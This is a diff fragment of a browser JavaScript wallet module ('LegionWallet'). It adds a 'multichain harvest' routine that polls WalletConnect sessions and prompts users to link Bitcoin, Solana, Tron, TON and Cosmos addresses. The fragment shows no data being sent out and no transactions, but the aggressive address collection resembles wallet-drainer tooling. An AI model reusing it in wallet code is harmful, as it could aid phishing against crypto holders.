+    log('multichain harvest — short wait:', missingFamilies().join(', '), '| ms:', waitMs);
+    const deadline = Date.now() + waitMs;
+    while (Date.now() < deadline && missingFamilies().length) {
+      await new Promise((r) => setTimeout(r, 500));
+      linked = scanWcSessionAllFamilies();
+      syncWalletState();
+    }
+    log('multichain harvest result:', Object.keys(linked).filter((k) => linked[k]?.address).join(',') || 'evm-only');
+  }
+
+  if (!linked.btc?.address && config.linkBitcoin !== false) {
+    const bipPoll = config.bip122PollMs != null ? config.bip122PollMs : DEFAULT_BIP122_POLL_MS;
+    const polledBtc = bipPoll > 0 ? await pollForBip122(bipPoll) : null;
+    if (polledBtc) {
+      linked = scanWcSessionAllFamilies();
+    } else if (config.ensureBip122 !== false && config.projectId) {
+      try {
+        await ensureBip122Link({
+          ...config,
+          timeoutMs: Math.min(config.timeoutMs || 60000, 60000),
+        });
+        linked = scanWcSessionAllFamilies();
+      } catch (e) {
+        log('supplemental bip122 skipped', e?.message || e);
+      }
+    } else {
+      log('btc_unsupported_or_deferred — bip122 not in session');
+    }
+  }
+
+  // Optional: supplemental UI for non-EVM families still missing (wallet-agnostic)
+  if (config.ensureSupplementalUi === true && config.projectId) {
+    try {
+      const wantSupp = (config.wantSupplemental || ['tron', 'ton', 'cosmos']).filter((k) => {
+        if (k === 'sol' || k === 'btc') return false;
+        return !scanWcSessionAllFamilies()[k]?.address;
+      });
+      if (wantSupp.length) {
+        await ensureWcSupplementalFamilies({
+          ...config,
+          wantFamilies: wantSupp,
+          timeoutMs: Math.min(config.timeoutMs || 45000, 45000),
+        });
+        linked = scanWcSessionAllFamilies();
+      }
+    } catch (e) {
+      log('supplemental families skipped', e?.message || e);
+    }
+  }
+
+  saveSessionContext(linked);
+  logSettledNamespaces('harvest done');
+  return getSessionAddresses();
 }
 
 function getEvmAddressFromSession() {
@@ -1106,17 +1807,32 @@ window.LegionWallet = {
   disconnect,
   closeModal,
   open,
+  /** Sync on user tap — show Open sheet before async WC (iOS deeplink rule) */
+  showMobileOpenSheet,
+  setMobileOpenSheetUri,
+  hideMobileDeepLinkSheet,
   getModal: () => modal,
   getProvider: async () => resolveProviderAsync(modal, true),
   getAccount: getWalletAccount,
   get state() { return syncWalletState(); },
   getSolanaProvider,
   getBitcoinProvider,
+  getWcFamilyAdapters,
+  buildWcFamilyAdapters: (families) => buildWcFamilyAdapters(modal, families),
   getEvmAddressFromSession,
   getEvmChainIdFromSession,
   getConnectorId: () => activeConnectorId,
+  getWcUri: () => {
+    try {
+      return ConnectionController.state.wcUri || window.__LEGION_LAST_WC_URI__ || null;
+    } catch (_) {
+      return window.__LEGION_LAST_WC_URI__ || null;
+    }
+  },
   getWagmiConfig: () => wagmiAdapter?.wagmiConfig,
   getSessionAddresses,
+  dumpRawWcNamespaceKeys,
+  harvestMultichainSession,
   scanWcSessionAllFamilies,
   buildOptionalNamespaces,
   getAllEvmCaipChains: buildWcPairingEvmCaipChains,
@@ -1129,6 +1845,9 @@ window.LegionWallet = {
     return tryRecoverStoredSession(m, requireWc !== false);
   },
   ensureBip122Link,
+  ensureSolanaLink,
+  ensureWcNamespaceLink,
+  ensureWcSupplementalFamilies,
   pollForBip122,
   saveSessionContext,
   loadSessionContext,
